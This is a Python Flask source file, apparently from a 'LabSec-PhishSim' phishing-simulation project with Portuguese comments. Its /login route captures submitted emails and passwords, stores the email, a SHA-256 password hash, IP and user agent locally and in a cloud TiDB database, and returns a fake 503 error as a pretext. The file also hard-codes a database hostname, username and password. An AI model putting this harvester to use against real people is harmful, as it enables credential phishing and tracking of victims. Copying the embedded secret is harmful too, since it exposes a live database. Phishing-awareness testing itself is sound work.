import os
import datetime
import hashlib
from flask import Flask, request
import pymysql

app = Flask(__name__)

# Caminho para o arquivo de log local (Redundância Forense)
LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')

# Configurações de conexão segura com o TiDB Cloud que você forneceu
TIDB_CONFIG = {
    'host': 'gateway01.us-east-1.prod.aws.tidbcloud.com',
    'port': 4000,
    'user': '2ekNitjymau1dcX.root',
    'password': '4k6IIcI6qLl8UfjS',
    'database': 'labsec_db',
    'ssl': {
        'ca': '/etc/ssl/certs/ca-certificates.crt'  # Certificado CA nativo do Ubuntu
    },
    'connect_timeout': 5
}

def registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Garante a persistência local em formato de arquivo texto estruturado."""
    log_line = (
        f"[{timestamp}] IP_ORIGEM: {ip_origem} | "
        f"USUARIO_ALVO: {email} | "
        f"CREDENTIAL_HASH(SHA256): {pwd_hash} | "
        f"NAV_INFO: {user_agent}\n"
    )
    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:
        f.write(log_line)

def registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Envia os metadados anonimizados via TLS para o cluster TiDB na nuvem."""
    conexao = None
    try:
        conexao = pymysql.connect(**TIDB_CONFIG)
        with conexao.cursor() as cursor:
            # Garante que a tabela exista antes de inserir (Evita falha se o banco estiver vazio)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS auditoria_acessos (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    timestamp VARCHAR(25),
                    usuario_alvo VARCHAR(255),
                    credential_hash_sha256 CHAR(64),
                    ip_origem VARCHAR(45),
                    user_agent TEXT
                );
            """)
            
            # Insere os dados na tabela estruturada
            sql = """
                INSERT INTO auditoria_acessos (timestamp, usuario_alvo, credential_hash_sha256, ip_origem, user_agent)
                VALUES (%s, %s, %s, %s, %s)
            """
            cursor.execute(sql, (timestamp, email, pwd_hash, ip_origem, user_agent))
        conexao.commit()
        print(f" -> Persistência em Nuvem (TiDB Cloud): OK")
    except Exception as e:
        print(f" -> Falha de contingência na nuvem: {e}")
    finally:
        if conexao:
            conexao.close()

@app.route('/login', methods=['POST'])
def login():
    # Coleta e higienização dos metadados recebidos
    email = request.form.get('email', 'Desconhecido')
    password_raw = request.form.get('password', '')
    
    ip_origem = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    
    # Tratamento Criptográfico (Security by Design)
    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    print(f"\n[!] Requisição capturada de {ip_origem} - Processando logs...")
    
    # Executa ambas as rotinas de persistência (Local + Nuvem)
    registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent)
    registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent)
    
    # Retorno de pretexting (Simulação de indisponibilidade)
    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503

if __name__ == '__main__':
    print("=========================================================")
    print(" LabSec-PhishSim - Motor de Auditoria c/ TiDB Cloud       ")
    print(" Escutando no endereço: http://0.0.0.0:5000              ")
    print("=========================================================")
    app.run(host='0.0.0.0', port=5000, debug=False)
